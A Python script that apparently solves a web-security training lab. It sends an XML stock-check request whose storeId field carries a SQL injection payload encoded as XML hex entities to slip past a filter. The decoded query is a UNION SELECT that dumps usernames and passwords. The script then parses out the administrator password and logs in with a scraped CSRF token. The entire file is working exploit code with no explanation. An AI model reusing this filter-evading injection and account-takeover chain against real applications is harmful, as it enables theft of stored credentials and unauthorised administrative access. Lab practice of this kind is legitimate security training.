import requests
import re
import sys

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 solution.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
stock_url = burp_url + '/product/stock'
login_url = burp_url + '/login'

burp_data = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><stockCheck><productId>3</productId><storeId>&#x32;&#x20;&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x7c;&#x7c;&#x20;&#x27;&#x7e;&#x27;&#x20;&#x7c;&#x7c;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;</storeId>\r\n</stockCheck>"
response = requests.post(stock_url, data=burp_data)
match = re.search(r'administrator~([a-z0-9]{20})', response.text)
admin_pass = match.group(1)
session = requests.Session()
response = session.get(login_url)

csrf_token = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = csrf_token.group(1)

burp0_data = {"csrf": csrf, "username": "administrator", "password": admin_pass}
print(burp0_data)
session.post(login_url, data=burp0_data)
